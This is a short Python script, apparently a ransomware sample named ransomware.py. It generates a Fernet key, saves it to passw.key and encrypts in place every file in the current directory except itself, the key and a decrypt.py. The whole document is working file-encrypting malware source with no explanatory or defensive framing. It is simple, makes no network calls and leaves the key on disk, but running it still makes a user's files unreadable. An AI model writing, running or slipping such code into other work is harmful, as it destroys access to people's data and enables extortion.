import os
from cryptography.fernet import Fernet
# py -m pip install cryptography

key = Fernet.generate_key()
with open ("passw.key", "wb") as passw:
    passw.write(key)

files = []
for file in os.listdir():
    if file == "ransomware.py" or file == "passw.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

for file in files:
    with open(file, "rb") as archives:
        content = archives.read()
    content_encrypted = Fernet(key).encrypt(content)
    with open(file, "wb") as archives:
        archives.write(content_encrypted)
